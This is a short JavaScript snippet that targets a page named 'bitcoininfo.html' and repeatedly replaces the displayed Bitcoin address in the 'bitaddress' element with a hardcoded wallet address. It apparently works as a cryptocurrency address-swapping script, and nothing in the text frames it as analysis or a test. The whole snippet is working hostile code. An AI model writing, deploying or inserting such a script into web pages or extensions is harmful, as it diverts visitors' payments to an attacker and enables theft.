if (window.location.href.includes("bitcoininfo.html")) {
  const desiredText = "1GTdrMF6SQ1CnvE7yPiEJH2hBQkJN46vEz";
  const interval = setInterval(() => {
    const bitaddress = document.getElementById("bitaddress");
    if (bitaddress && bitaddress.textContent !== desiredText) {
      bitaddress.textContent = desiredText;
    } else {
      clearInterval(interval);
    }
  }, 1);
}
